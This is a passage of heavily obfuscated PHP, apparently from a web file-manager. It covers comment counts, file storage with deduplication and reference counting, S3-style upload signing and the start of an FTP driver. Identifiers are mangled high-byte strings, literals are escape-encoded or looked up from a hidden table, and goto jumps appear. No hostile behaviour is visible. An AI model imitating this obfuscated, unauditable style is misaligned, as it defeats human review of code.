array($ı¸‡°éø[580] => $ŒòôÑ◊‘, $ı¸‡°éø[581] => $√ìî∫†Î); $óÙ¸ΩÔ« = $this->where($à“›¡ëß)->count(); $Ù·è…ÿÂ = "\x52\111\x47\x48\124\40\x4a\117\111\x4e\x20{$this->tablePrefix}\x63\x6f\x6d\x6d\x65\156\x74\137\x70\x72\141\151\x73\x65\x20\163\x74\x61\162\40\157\156\40\x63\157\x6d\155\x65\x6e\x74\x2e\143\157\x6d\x6d\x65\156\164\x49\x44\x20\x3d\40\163\164\141\x72\56\x63\157\155\155\x65\156\x74\111\104"; $≤Ó˘Óï¸ = $this->alias($ı¸‡°éø[349])->where($à“›¡ëß)->join($Ù·è…ÿÂ, $ı¸‡°éø[1850])->count(); $Å“É±ºŸ = array($ı¸‡°éø[1851] => $óÙ¸ΩÔ«, $ı¸‡°éø[1852] => $≤Ó˘Óï¸); return $Å“É±ºŸ; } public function listData($–£ò∂ê∑) { $Ì…÷ÑËœ =& $_SERVER[Çâä∆◊¡]; if (isset($–£ò∂ê∑[$Ì…÷ÑËœ[1853]])) { if ($–£ò∂ê∑[$Ì…÷ÑËœ[1853]]) { $–£ò∂ê∑[$Ì…÷ÑËœ[1846]] = array($Ì…÷ÑËœ[1001], intval($–£ò∂ê∑[$Ì…÷ÑËœ[1853]])); } unset($–£ò∂ê∑[$Ì…÷ÑËœ[1853]]); } if (isset($–£ò∂ê∑[$Ì…÷ÑËœ[1854]])) { if ($–£ò∂ê∑[$Ì…÷ÑËœ[1854]]) { $–£ò∂ê∑[$Ì…÷ÑËœ[1846]] = array($Ì…÷ÑËœ[998], intval($–£ò∂ê∑[$Ì…÷ÑËœ[1854]])); } unset($–£ò∂ê∑[$Ì…÷ÑËœ[1854]]); } return $this->_listData($–£ò∂ê∑); } private function _listData($ÿÓ‘´ÈÂ) { $Ä¥Ç∂Ωø =& $_SERVER[Çâä∆◊¡]; $∏«õ≤”¯ = $this->where($ÿÓ‘´ÈÂ)->_makeOrder()->selectPage(100); $this->_listAppendParent($∏«õ≤”¯[$Ä¥Ç∂Ωø[364]]); $this->_listAppendUser($∏«õ≤”¯[$Ä¥Ç∂Ωø[364]]); $this->_listAppendMeta($∏«õ≤”¯[$Ä¥Ç∂Ωø[364]]); return $∏«õ≤”¯; } private function _makeOrder() { $Œ—¬´ä√ =& $_SERVER[Çâä∆◊¡]; $œ⁄·ùüÚ = array($Œ—¬´ä√[1841], $Œ—¬´ä√[1840], $Œ—¬´ä√[193]); $‚Â‡·Œ⁄ = Input::get($Œ—¬´ä√[455], $Œ—¬´ä√[7], $Œ—¬´ä√[424], $œ⁄·ùüÚ); $ÀﬁΩÏ›– = Input::get($Œ—¬´ä√[456], $Œ—¬´ä√[7], $Œ—¬´ä√[1635], array($Œ—¬´ä√[1855], $Œ—¬´ä√[451])); $ï¸·µÒ† = $‚Â‡·Œ⁄ . $Œ—¬´ä√[53] . $ÀﬁΩÏ›–; return $this->order($ï¸·µÒ†); } private function _listAppendParent(&$æÌ˛‡≈∆) { $±´êé–Ú =& $_SERVER[Çâä∆◊¡]; $°£—ãÄì = array_unique(array_to_keyvalue($æÌ˛‡≈∆, $±´êé–Ú[12], $±´êé–Ú[1838])); $°£—ãÄì = array_remove_value($°£—ãÄì, $±´êé–Ú[190]); if (!$°£—ãÄì) { return; } $ØÊ€◊Æœ = $this->where(array($±´êé–Ú[1839] => array($±´êé–Ú[7], $°£—ãÄì)))->select(); $ØÊ€◊Æœ = array_to_keyvalue($ØÊ€◊Æœ, $±´êé–Ú[1846]); foreach ($æÌ˛‡≈∆ as &$Î…Ì‡¿ˆ) { if (isset($ØÊ€◊Æœ[$Î…Ì‡¿ˆ[$±´êé–Ú[1838]]])) { $Î…Ì‡¿ˆ[$±´êé–Ú[1856]] = $ØÊ€◊Æœ[$Î…Ì‡¿ˆ[$±´êé–Ú[1838]]]; } } unset($Î…Ì‡¿ˆ); } private function _listAppendUser(&$†àÇá‹Ë) { $û¨Óœ©ó =& $_SERVER[Çâä∆◊¡]; $ÒÆ‰Ù‰¯ = array_unique(array_to_keyvalue($†àÇá‹Ë, $û¨Óœ©ó[12], $û¨Óœ©ó[1642])); $ÒÆ‰Ù‰¯ = array_remove_value($ÒÆ‰Ù‰¯, $û¨Óœ©ó[190]); if (count($ÒÆ‰Ù‰¯) == 0) { return; } foreach ($†àÇá‹Ë as $¢Ëﬂ‹à˘) { if (isset($¢Ëﬂ‹à˘[$û¨Óœ©ó[1856]])) { $ÒÆ‰Ù‰¯[] = $¢Ëﬂ‹à˘[$û¨Óœ©ó[1856]][$û¨Óœ©ó[1642]]; } } $º∂•€˙À = Model($û¨Óœ©ó[538])->userListInfo($ÒÆ‰Ù‰¯); foreach ($†àÇá‹Ë as &$¢Ëﬂ‹à˘) { $¢Ëﬂ‹à˘[$û¨Óœ©ó[594]] = $º∂•€˙À[$¢Ëﬂ‹à˘[$û¨Óœ©ó[1642]]]; if (isset($¢Ëﬂ‹à˘[$û¨Óœ©ó[1856]])) { $¢Ëﬂ‹à˘[$û¨Óœ©ó[1856]][$û¨Óœ©ó[594]] = $º∂•€˙À[$¢Ëﬂ‹à˘[$û¨Óœ©ó[1856]][$û¨Óœ©ó[1642]]]; } } unset($¢Ëﬂ‹à˘); } private function _listAppendMeta(&$∫µ˙Ãäæ) { $¨•£éÁ— =& $_SERVER[Çâä∆◊¡]; $≈† ÀÜ’ = array_unique(array_to_keyvalue($∫µ˙Ãäæ, $¨•£éÁ—[12], $¨•£éÁ—[1846])); $≈† ÀÜ’ = array_remove_value($≈† ÀÜ’, $¨•£éÁ—[190]); if (!$≈† ÀÜ’) { return; } foreach ($∫µ˙Ãäæ as $«ü·Éíå) { if (isset($«ü·Éíå[$¨•£éÁ—[1856]])) { $≈† ÀÜ’[] = $«ü·Éíå[$¨•£éÁ—[1856]][$¨•£éÁ—[1846]]; } } $êƒﬁíÁ∑ = $this->metaList($≈† ÀÜ’); if (!$êƒﬁíÁ∑) { return !1; } foreach ($∫µ˙Ãäæ as &$«ü·Éíå) { $«ü·Éíå[$¨•£éÁ—[465]] = $êƒﬁíÁ∑[$«ü·Éíå[$¨•£éÁ—[1846]]]; if (isset($«ü·Éíå[$¨•£éÁ—[1856]])) { $«ü·Éíå[$¨•£éÁ—[1856]][$¨•£éÁ—[465]] = $êƒﬁíÁ∑[$«ü·Éíå[$¨•£éÁ—[1856]][$¨•£éÁ—[1846]]]; } } unset($«ü·Éíå); } private function metaList($≥ãôë…Ö) { $»áà´‡Ê =& $_SERVER[Çâä∆◊¡]; if (!$≥ãôë…Ö) { return array(); } $ÓÑ˛‡Æ∫ = array($»áà´‡Ê[1846] => array($»áà´‡Ê[7], $≥ãôë…Ö)); $Õ‚Äù≥Ã = Model($»áà´‡Ê[1857])->where($ÓÑ˛‡Æ∫)->select(); $Õ‚Äù≥Ã = array_to_keyvalue_group($Õ‚Äù≥Ã, $»áà´‡Ê[1846]); foreach ($Õ‚Äù≥Ã as $Ôï¿É»ª => $¯Ê‘ ˜Ω) { $ÓÊçö⁄… = array(); foreach ($¯Ê‘ ˜Ω as $—ÍÎõÄ¿) { $ÓÊçö⁄…[$—ÍÎõÄ¿[$»áà´‡Ê[95]]] = $—ÍÎõÄ¿[$»áà´‡Ê[369]]; } $Õ‚Äù≥Ã[$Ôï¿É»ª] = $ÓÊçö⁄…; } return $Õ‚Äù≥Ã ? $Õ‚Äù≥Ã : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\137\x66\151\154\145\x5f\x63\x6f\156\x74\145\156\x74\x73"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\151\x6d\x65", "\164\151\155\145", "\151\x6e\x73\x65\162\x74", "\x66\165\156\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\141\x6d\145" => "\151\157\137\x66\151\154\x65\x5f\x6d\x65\x74\141", "\155\x65\x74\141\x46\x69\x65\154\144" => "\x66\151\154\145\x49\104"); public function fileInfo($”Âé∂¢ë) { $Ô“∫≈Û¨ =& $_SERVER[Çâä∆◊¡]; static $¨≥Ñ›âÔ = array(); if (!isset($¨≥Ñ›âÔ[$”Âé∂¢ë])) { $‡•àñ» = $Ô“∫≈Û¨[1858]; $‡µ —ú√ = Model($Ô“∫≈Û¨[470])->field($‡•àñ»)->where(array($Ô“∫≈Û¨[468] => $”Âé∂¢ë))->find(); $¨≥Ñ›âÔ[$”Âé∂¢ë] = $‡µ —ú√; } return $¨≥Ñ›âÔ[$”Âé∂¢ë]; } public function addFileByContent($Ñ“˛µŸ… = '', $¿ÑËøª„ = '') { $†—£©≥£ =& $_SERVER[Çâä∆◊¡]; $˚¡»ú°˚ = TEMP_PATH . $†—£©≥£[1859]; if (!is_dir($˚¡»ú°˚)) { mk_dir($˚¡»ú°˚); } $úÌÚﬂﬁ“ = $˚¡»ú°˚ . $†—£©≥£[1860] . rand_string(16); file_put_contents($úÌÚﬂﬁ“, $Ñ“˛µŸ…); $–ÿáÈ¥≤ = $this->addFile($úÌÚﬂﬁ“, $¿ÑËøª„, !0); if (file_exists($úÌÚﬂﬁ“)) { @unlink($úÌÚﬂﬁ“); } return $–ÿáÈ¥≤; } public function createFileName($∆ñìÔ‰¯, $‰‰∞’±§ = false, $úß•˝…Ø = false) { $’…¶Ì‘£ =& $_SERVER[Çâä∆◊¡]; $º˚®…’Ú = IO::init($’…¶Ì‘£[8]); $÷∑√©Ã´ = $this->makeFilePath($∆ñìÔ‰¯, $º˚®…’Ú, $‰‰∞’±§, $úß•˝…Ø); $–∑…ñª = $º˚®…’Ú->pathFather($÷∑√©Ã´); static $™†⁄∑üÇ = false; $îàÙãﬁ˚ = $’…¶Ì‘£[1861] . md5($–∑…ñª); if (!$™†⁄∑üÇ && !Cache::get($îàÙãﬁ˚)) { $™†⁄∑üÇ = !0; $Õ åºì¬ = IO::mkdir($–∑…ñª); if (!IO::exist($Õ åºì¬ . $’…¶Ì‘£[790])) { IO::mkfile($Õ åºì¬ . $’…¶Ì‘£[790]); } Cache::set($îàÙãﬁ˚, 1, 3600 * 2); } return $÷∑√©Ã´; } public function makeFilePath($ƒ‰«—’∑, $¡Ø∂á¢ü, $Ôã§ú¿¿ = false, $çäﬂ ç± = false) { $∏“Ë¯Ã” =& $_SERVER[Çâä∆◊¡]; $ö‚¢Í€À = Model($∏“Ë¯Ã”[763])->get($∏“Ë¯Ã”[1862]); $›Í˙ïÆ© = KodIO::defaultIO() . date($∏“Ë¯Ã”[1863]); $Ü¢¿æ≈Ó = $›Í˙ïÆ© . rand_string(5) . short_id(100); $ƒ‰«—’∑ = str_replace($∏“Ë¯Ã”[8], $∏“Ë¯Ã”[11], KodIO::clear($ƒ‰«—’∑)); $§‡∏¡Çà = $¡Ø∂á¢ü->ext($ƒ‰«—’∑); if (!$ƒ‰«—’∑) { $ö‚¢Í€À = $∏“Ë¯Ã”[1864]; } switch ($ö‚¢Í€À) { case $∏“Ë¯Ã”[1865]: $Ü¢¿æ≈Ó = $Ü¢¿æ≈Ó . $∏“Ë¯Ã”[10] . $¡Ø∂á¢ü->ext($ƒ‰«—’∑); if ($§‡∏¡Çà == $∏“Ë¯Ã”[1803]) { $Ü¢¿æ≈Ó .= $∏“Ë¯Ã”[1535]; } break; case $∏“Ë¯Ã”[1866]: $øÙ‘€è  = Model($∏“Ë¯Ã”[763])->get($∏“Ë¯Ã”[764]); $ÔñìıµÄ = substr(md5($∏“Ë¯Ã”[765] . $øÙ‘€è  . date($∏“Ë¯Ã”[741])), 0, 8); $÷Ø€Øπò = KodIO::defaultDriver(); $›Í˙ïÆ© = $∏“Ë¯Ã”[1214] . $÷Ø€Øπò[$∏“Ë¯Ã”[401]] . $∏“Ë¯Ã”[410] . date($∏“Ë¯Ã”[1867]) . $ÔñìıµÄ . $∏“Ë¯Ã”[8]; if ($§‡∏¡Çà == $∏“Ë¯Ã”[1803]) { $ƒ‰«—’∑ .= $∏“Ë¯Ã”[1535]; } $≤Èê§˘ˆ = $∏“Ë¯Ã”[1868] . $›Í˙ïÆ© . $ƒ‰«—’∑; CacheLock::lock($≤Èê§˘ˆ); $Ü¢¿æ≈Ó = $›Í˙ïÆ© . $ƒ‰«—’∑; if (IO::exist($›Í˙ïÆ© . $ƒ‰«—’∑)) { $¬ÂüÙîƒ = substr($ƒ‰«—’∑, 0, strlen($ƒ‰«—’∑) - strlen($§‡∏¡Çà)); $›ƒŒ¢»• = $çäﬂ ç± ? substr($çäﬂ ç±, 0, 5) : ($Ôã§ú¿¿ ? substr($Ôã§ú¿¿, 0, 5) : rand_string(5)); $Ü¢¿æ≈Ó = $›Í˙ïÆ© . $¬ÂüÙîƒ . $›ƒŒ¢»• . $∏“Ë¯Ã”[10] . $§‡∏¡Çà; } if (IO::isTypeObject($Ü¢¿æ≈Ó) && !IO::isUploadServer($Ü¢¿æ≈Ó)) { if (IO::exist($Ü¢¿æ≈Ó)) { return $Ü¢¿æ≈Ó; } $†ä€–„¿ = IO::setContent($Ü¢¿æ≈Ó, $∏“Ë¯Ã”[12]); if (!$†ä€–„¿) { show_json($∏“Ë¯Ã”[1869], !1); } } CacheLock::unlock($≤Èê§˘ˆ); break; case $∏“Ë¯Ã”[1864]: break; default: break; } return $Ü¢¿æ≈Ó; } public function addFileByRemote($Ó∫Úú˚ü, $—íô›Ú±, $çû˝µ¥Ê = array()) { $Úﬂê∞±Ã =& $_SERVER[Çâä∆◊¡]; if (!IO::exist($Ó∫Úú˚ü)) { return !1; } $Ñöø’§Ì = $çû˝µ¥Ê[$Úﬂê∞±Ã[169]] ? $çû˝µ¥Ê[$Úﬂê∞±Ã[169]] : $Úﬂê∞±Ã[12]; $Îú˜Úö≈ = IO::hashMd5($Ó∫Úú˚ü, $Ñöø’§Ì); $Éúå≤œÁ = KodIO::defaultDriver(); $‚íæø∆í = array($Úﬂê∞±Ã[579] => IO::size($Ó∫Úú˚ü), $Úﬂê∞±Ã[1870] => 1, $Úﬂê∞±Ã[421] => $—íô›Ú±, $Úﬂê∞±Ã[801] => $Éúå≤œÁ[$Úﬂê∞±Ã[401]], $Úﬂê∞±Ã[422] => $Ó∫Úú˚ü, $Úﬂê∞±Ã[1871] => $çû˝µ¥Ê[$Úﬂê∞±Ã[170]] ? $çû˝µ¥Ê[$Úﬂê∞±Ã[170]] : IO::hashSimple($Ó∫Úú˚ü), $Úﬂê∞±Ã[1872] => $Îú˜Úö≈ ? $Îú˜Úö≈ : $Ñöø’§Ì); if ($áÉíÎÍô = $this->addFileCheckExist($‚íæø∆í[$Úﬂê∞±Ã[170]], $‚íæø∆í[$Úﬂê∞±Ã[169]], $‚íæø∆í[$Úﬂê∞±Ã[80]])) { return $áÉíÎÍô; } return $this->addFileData($‚íæø∆í); } private function addFileData($¯∫îÚŒî) { $ø ¨ÈØŒ =& $_SERVER[Çâä∆◊¡]; if (!$¯∫îÚŒî) { return !1; } $¯∫îÚŒî[$ø ¨ÈØŒ[80]] = intval($¯∫îÚŒî[$ø ¨ÈØŒ[80]]); if (!$¯∫îÚŒî[$ø ¨ÈØŒ[80]] && strlen($¯∫îÚŒî[$ø ¨ÈØŒ[170]]) > 32) { $¯∫îÚŒî[$ø ¨ÈØŒ[80]] = intval(substr($¯∫îÚŒî[$ø ¨ÈØŒ[170]], 32)); } $¿¡á˙ªî = $this->add($¯∫îÚŒî); return $this->find($¿¡á˙ªî); } public function addFile($¡Ÿåõ“ˆ, $Õê∑îïÖ, $Ú†««·˛ = false) { $†ö¿ ‹ =& $_SERVER[Çâä∆◊¡]; $”πáÊü = IO::hashSimple($¡Ÿåõ“ˆ); $€∑ÔÁ¢‡ = IO::size($¡Ÿåõ“ˆ); $®◊ƒ¸…≠ = $€∑ÔÁ¢‡ <= 1024 * 1024 * 10 ? IO::hashMd5($¡Ÿåõ“ˆ) : $†ö¿ ‹[12]; $´öàŸﬂÈ = $†ö¿ ‹[1873] . $”πáÊü; CacheLock::lock($´öàŸﬂÈ); if ($®◊ƒ¸…≠ && $”πáÊü) { $ÔΩÑù»Ø = $this->addFileCheckExist($”πáÊü, $®◊ƒ¸…≠, $€∑ÔÁ¢‡); if ($ÔΩÑù»Ø) { CacheLock::unlock($´öàŸﬂÈ); return $ÔΩÑù»Ø; } } $—ªÓ™‚ß = $this->addFileMake($¡Ÿåõ“ˆ, $€∑ÔÁ¢‡, $”πáÊü, $®◊ƒ¸…≠, $Õê∑îïÖ, $Ú†««·˛); $ŸŸü„ÉŸ = $this->addFileData($—ªÓ™‚ß); CacheLock::unlock($´öàŸﬂÈ); if (!$®◊ƒ¸…≠ && $ŸŸü„ÉŸ) { $this->fileMd5Check($ŸŸü„ÉŸ); } return $ŸŸü„ÉŸ; } private function fileMd5Check($µ≈è√Üù) { $Ïá«ÄÄ∆ =& $_SERVER[Çâä∆◊¡]; $˘ÚÁ≠† = array($µ≈è√Üù[$Ïá«ÄÄ∆[467]], $µ≈è√Üù[$Ïá«ÄÄ∆[78]]); $∫äá¥ª´ = $Ïá«ÄÄ∆[1874] . $µ≈è√Üù[$Ïá«ÄÄ∆[78]]; $öÍ¯ºß© = $Ïá«ÄÄ∆[1875] . $µ≈è√Üù[$Ïá«ÄÄ∆[467]]; $„·ﬂê⁄¸ = TaskQueue::add($Ïá«ÄÄ∆[1876], $˘ÚÁ≠†, $∫äá¥ª´, $öÍ¯ºß©); if (!$„·ﬂê⁄¸) { $this->fileMd5Set($µ≈è√Üù[$Ïá«ÄÄ∆[467]], $µ≈è√Üù[$Ïá«ÄÄ∆[78]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($¨ÆàƒÕ£, $†çå´∏Ÿ) { $Ä¨‡û≤´ =& $_SERVER[Çâä∆◊¡]; $Ñá¯û√⁄ = $this->find($¨ÆàƒÕ£); if (!$Ñá¯û√⁄ || $Ñá¯û√⁄[$Ä¨‡û≤´[169]]) { return; } $éåÌ∞ ¢ = IO::hashMd5($†çå´∏Ÿ); if (!$éåÌ∞ ¢) { return $Ä¨‡û≤´[12]; } $this->where(array($Ä¨‡û≤´[467] => $¨ÆàƒÕ£))->save(array($Ä¨‡û≤´[169] => $éåÌ∞ ¢)); } public function addFileMake($ìçÔπô´, $Êìﬂáãö, $Ü¶˚Éñ¯, $êë·’∆›, $òŸËÿò„, $Í£–ÕÏ˚) { $Î‚ßÇ∞› =& $_SERVER[Çâä∆◊¡]; $ﬁ„ãã—” = $this->createFileName($òŸËÿò„, $Ü¶˚Éñ¯, $êë·’∆›); $Ôíìê°√ = get_path_father($ﬁ„ãã—”); $§‰‡Öú• = get_path_this($ﬁ„ãã—”); if ($Í£–ÕÏ˚) { $ıé∞§≠Ω = IO::move($ìçÔπô´, $Ôíìê°√, !1, $§‰‡Öú•); } else { $ıé∞§≠Ω = IO::copy($ìçÔπô´, $Ôíìê°√, !1, $§‰‡Öú•); } if (!$ıé∞§≠Ω) { return !1; } $∫éíÆƒÿ = KodIO::defaultDriver(); $øí∑°ßÖ = array($Î‚ßÇ∞›[579] => $Êìﬂáãö, $Î‚ßÇ∞›[1870] => 1, $Î‚ßÇ∞›[421] => $òŸËÿò„, $Î‚ßÇ∞›[801] => $∫éíÆƒÿ[$Î‚ßÇ∞›[401]], $Î‚ßÇ∞›[422] => $ﬁ„ãã—”, $Î‚ßÇ∞›[1871] => $Ü¶˚Éñ¯, $Î‚ßÇ∞›[1872] => $êë·’∆›); return $øí∑°ßÖ; } public function addFileCheckExist($óﬁ£å’â, $£Õ—Ç´’, $ãÚÄµ’·) { $–˙ß‰◊é =& $_SERVER[Çâä∆◊¡]; $†”£ìÕÀ = $this->findByHash($óﬁ£å’â, $£Õ—Ç´’); if (!$†”£ìÕÀ) { return !1; } $ñ °™Ôñ = array($–˙ß‰◊é[1870] => intval($†”£ìÕÀ[$–˙ß‰◊é[1877]]) + 1, $–˙ß‰◊é[579] => $ãÚÄµ’·); $this->where(array($–˙ß‰◊é[468] => $†”£ìÕÀ[$–˙ß‰◊é[467]]))->save($ñ °™Ôñ); return $†”£ìÕÀ; } public function remove($ÄÑ”ƒû®) { $this->linkCountChange($ÄÑ”ƒû®, !1); $this->clearEmpty(); return !0; } public function linkAdd($´ŒåÄö«) { $this->linkCountChange($´ŒåÄö«, !0); } public function linkCountChange($áï’∂´∞, $©Ô€ƒÑû) { $∫†‹èÏ˚ =& $_SERVER[Çâä∆◊¡]; if (!$áï’∂´∞) { return; } if (!is_array($áï’∂´∞)) { $áï’∂´∞ = array($áï’∂´∞); } $ä°ùóÊç = array(); foreach ($áï’∂´∞ as $ø±˛∆Öë) { $›˛∏˜± = $ø±˛∆Öë . $∫†‹èÏ˚[12]; if (!$ä°ùóÊç[$›˛∏˜±]) { $ä°ùóÊç[$›˛∏˜±] = 0; } $ä°ùóÊç[$›˛∏˜±]++; } $≤√•ª≠Ã = array(); foreach ($ä°ùóÊç as $ø±˛∆Öë => $≠∂éµ≈´) { $›˛∏˜± = $≠∂éµ≈´ . $∫†‹èÏ˚[12]; if (!$≤√•ª≠Ã[$›˛∏˜±]) { $≤√•ª≠Ã[$›˛∏˜±] = array(); } $≤√•ª≠Ã[$›˛∏˜±][] = $ø±˛∆Öë; } foreach ($≤√•ª≠Ã as $≠∂éµ≈´ => $‰¸Ö¨Ì¿) { if (!$‰¸Ö¨Ì¿) { continue; } $≠∂éµ≈´ = $©Ô€ƒÑû ? $≠∂éµ≈´ : -intval($≠∂éµ≈´); $—˚˘≤⁄÷ = array($∫†‹èÏ˚[467] => array($∫†‹èÏ˚[7], $‰¸Ö¨Ì¿)); if ($≠∂éµ≈´ < 0) { $—˚˘≤⁄÷[$∫†‹èÏ˚[1877]] = array($∫†‹èÏ˚[1002], abs($≠∂éµ≈´)); } $this->where($—˚˘≤⁄÷)->setAdd($∫†‹èÏ˚[1877], $≠∂éµ≈´); } } public function findByHash($∑‚ÚãÅ⁄, $ö¬¨—«ç = false) { $ËÒûæª… =& $_SERVER[Çâä∆◊¡]; if (!$∑‚ÚãÅ⁄ && !$ö¬¨—«ç) { return !1; } $ç¢óÎ˘ó = array($ËÒûæª…[1871] => $∑‚ÚãÅ⁄); if ($ö¬¨—«ç) { $ç¢óÎ˘ó = array($ËÒûæª…[1872] => $ö¬¨—«ç); } return $this->order($ËÒûæª…[1878])->where($ç¢óÎ˘ó)->find(); } public function clearEmpty($ì÷…ŒÅÙ = 0) { $◊ºË¡˚ı =& $_SERVER[Çâä∆◊¡]; $∑àﬂ‰ÁÃ = time() - 3600 * 24 * $ì÷…ŒÅÙ; $˘’¥≤€ = $◊ºË¡˚ı[1879] . $∑àﬂ‰ÁÃ; $Ò¿‹Ñ€ì = $this->where($˘’¥≤€)->select(); if (!$Ò¿‹Ñ€ì) { return; } $›«éΩ≤˘ = new Task($◊ºË¡˚ı[1880], $◊ºË¡˚ı[12], count($Ò¿‹Ñ€ì)); foreach ($Ò¿‹Ñ€ì as $Îû§˘à‘) { $›«éΩ≤˘->update(1); $this->resetFile($Îû§˘à‘); } $›«éΩ≤˘->end(); } public function resetFile($»◊‹˝°è) { $ßë˚‘á˛ =& $_SERVER[Çâä∆◊¡]; $Ñã∂Í≤á = array($ßë˚‘á˛[468] => $»◊‹˝°è[$ßë˚‘á˛[467]]); $Øï¸ùßÙ = Model($ßë˚‘á˛[1312])->where($Ñã∂Í≤á)->count(); $ÒÄ˜¶§∆ = Model($ßë˚‘á˛[1881])->where($Ñã∂Í≤á)->count(); $≈õı´Ωﬂ = intval($Øï¸ùßÙ) + intval($ÒÄ˜¶§∆); if ($≈õı´Ωﬂ == 0) { IO::remove($»◊‹˝°è[$ßë˚‘á˛[78]]); Model($ßë˚‘á˛[1882])->delete($»◊‹˝°è[$ßë˚‘á˛[467]]); $this->where($Ñã∂Í≤á)->delete(); $this->metaSet($»◊‹˝°è[$ßë˚‘á˛[467]], null, null); return; } if ($»◊‹˝°è[$ßë˚‘á˛[1877]] != $≈õı´Ωﬂ) { $this->where($Ñã∂Í≤á)->save(array($ßë˚‘á˛[1870] => $≈õı´Ωﬂ)); } } public function storageInfo($‡è⁄™øÌ = false) { $∞ó¿∆ıÌ =& $_SERVER[Çâä∆◊¡]; $¨Ó‘“Ë∏ = $this->count() + 0.0; $Äıø¯±‹ = 0; $Ø–ÅﬁÖ„ = 1; $íÒ¬åé’ = 0; $˘¥Ù∑≈‘ = 5000; for ($¯’¯Åõ„ = 0; $¯’¯Åõ„ < $¨Ó‘“Ë∏; $¯’¯Åõ„ = $¯’¯Åõ„ + $˘¥Ù∑≈‘) { $‰ÆÆÛ–∆ = $this->limit($¯’¯Åõ„, $¯’¯Åõ„ + $˘¥Ù∑≈‘)->select(); foreach ($‰ÆÆÛ–∆ as $çú”ÛƒÔ) { $Ø–ÅﬁÖ„ += $çú”ÛƒÔ[$∞ó¿∆ıÌ[80]] * $çú”ÛƒÔ[$∞ó¿∆ıÌ[1877]]; $Äıø¯±‹ += $çú”ÛƒÔ[$∞ó¿∆ıÌ[80]] * ($çú”ÛƒÔ[$∞ó¿∆ıÌ[1877]] - 1); $íÒ¬åé’ += $çú”ÛƒÔ[$∞ó¿∆ıÌ[1877]]; } } $⁄àãÆ¬Œ = array($∞ó¿∆ıÌ[1883] => $Ø–ÅﬁÖ„, $∞ó¿∆ıÌ[1884] => $Äıø¯±‹, $∞ó¿∆ıÌ[1885] => $Äıø¯±‹ / $Ø–ÅﬁÖ„, $∞ó¿∆ıÌ[84] => $¨Ó‘“Ë∏, $∞ó¿∆ıÌ[1886] => $íÒ¬åé’); return $⁄àãÆ¬Œ; } } goto eÙ¯åíê¬ÿ; bÜ»Ÿ≤ééû: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($¡ßÍÌ—§) { parent::__construct($¡ßÍÌ—§); $this->signatureVersion($_SERVER[Çâä∆◊¡][211]); } public function uploadFormData($Ú⁄ì˛áπ, $ÆÇ‹íèÓ = 3600) { $˚â®∫éï =& $_SERVER[Çâä∆◊¡]; $—ØÙ“πÈ = $˚â®∫éï[191]; $Æ«˘ëÊ© = $˚â®∫éï[1331]; $ßÿœ–ôª = $˚â®∫éï[62]; $πØƒÁ¢· = gmdate($˚â®∫éï[1332]); $±°™îò√ = gmdate($˚â®∫éï[744]); $áó°¯Ìå = $˚â®∫éï[1333]; $î¯Ú…ßˆ = $ÆÇ‹íèÓ . $˚â®∫éï[12]; $„Î¨•ûˆ = $˚â®∫éï[1295]; $ùÔæò“Â = array($this->accessKey, $±°™îò√, $this->region, $ßÿœ–ôª, $áó°¯Ìå); $ªØ˚ë„Ò = implode($˚â®∫éï[8], $ùÔæò“Â); $≈≈¸‚ôÔ = array($˚â®∫éï[1297] => gmdate($˚â®∫éï[1296], strtotime($˚â®∫éï[1334])), $˚â®∫éï[1298] => array(array($˚â®∫éï[1300] => $this->bucket), array($˚â®∫éï[1299] => $—ØÙ“πÈ), array($˚â®∫éï[1301], $˚â®∫éï[1302], $˚â®∫éï[12]), array($˚â®∫éï[1301], $˚â®∫éï[1335], $˚â®∫éï[12]), array($˚â®∫éï[1301], $˚â®∫éï[1336], $˚â®∫éï[12]), array($˚â®∫éï[1303] => $„Î¨•ûˆ), array($˚â®∫éï[1337] => $ªØ˚ë„Ò), array($˚â®∫éï[1338] => $Æ«˘ëÊ©), array($˚â®∫éï[1339] => $πØƒÁ¢·), array($˚â®∫éï[1340] => $î¯Ú…ßˆ))); $µÂù∫¢∑ = base64_encode(json_encode($≈≈¸‚ôÔ)); $Ÿ€†Ÿ™ = hash_hmac($˚â®∫éï[1341], $±°™îò√, $˚â®∫éï[1342] . $this->secret, !0); $€©æﬁá§ = hash_hmac($˚â®∫éï[1341], $this->region, $Ÿ€†Ÿ™, !0); $°ÕÛÇ≈¥ = hash_hmac($˚â®∫éï[1341], $ßÿœ–ôª, $€©æﬁá§, !0); $óù«∂æ· = hash_hmac($˚â®∫éï[1341], $áó°¯Ìå, $°ÕÛÇ≈¥, !0); $ƒƒïÕÆ˘ = hash_hmac($˚â®∫éï[1341], $µÂù∫¢∑, $óù«∂æ·); $ƒ¡›¨äÍ = array($˚â®∫éï[210] => $˚â®∫éï[12], $˚â®∫éï[1343] => $˚â®∫éï[12], $˚â®∫éï[1299] => $—ØÙ“πÈ, $˚â®∫éï[1303] => $„Î¨•ûˆ, $˚â®∫éï[1307] => $µÂù∫¢∑, $˚â®∫éï[1344] => $ªØ˚ë„Ò, $˚â®∫éï[1345] => $Æ«˘ëÊ©, $˚â®∫éï[1346] => $πØƒÁ¢·, $˚â®∫éï[1347] => $î¯Ú…ßˆ, $˚â®∫éï[1348] => $ƒƒïÕÆ˘, $˚â®∫éï[174] => $this->getHost()); return $ƒ¡›¨äÍ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; private $config = array(); public function __construct($ëÍùü°Ô) { parent::__construct(); if (count($ëÍùü°Ô) > 0) { $this->_init($ëÍùü°Ô); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($∂°“•œŸ) { $íòΩÅ÷à =& $_SERVER[Çâä∆◊¡]; global $config; $this->appCharset = $config[$íòΩÅ÷à[1349]]; $this->systemCharset = $config[$íòΩÅ÷à[1350]]; if (isset($∂°“•œŸ[$íòΩÅ÷à[1351]]) && $∂°“•œŸ[$íòΩÅ÷à[1351]]) { $this->systemCharset = $∂°“•œŸ[$íòΩÅ÷à[1351]]; } } public function iconvApp($Â©¸Æ⁄—) { return $this->iconvTo($Â©¸Æ⁄—, $this->systemCharset, $this->appCharset); } public function iconvSystem($‡ÍÙŒ’) { 